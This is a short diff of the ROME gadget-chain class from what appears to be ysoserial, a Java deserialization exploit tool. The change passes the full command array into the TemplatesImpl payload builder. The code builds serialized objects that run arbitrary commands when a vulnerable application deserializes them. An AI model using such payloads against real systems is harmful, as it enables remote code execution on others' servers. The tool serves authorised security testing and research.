@@ -33,7 +33,7 @@ import ysoserial.payloads.util.PayloadRunner;
 public class ROME implements ObjectPayload<Object> {
 
     public Object getObject ( String ... command ) throws Exception {
-        Object o = Gadgets.createTemplatesImpl(command[0]);
+        Object o = Gadgets.createTemplatesImpl(command);
         ObjectBean delegate = new ObjectBean(Templates.class, o);
         ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
         return Gadgets.makeMap(root, root);
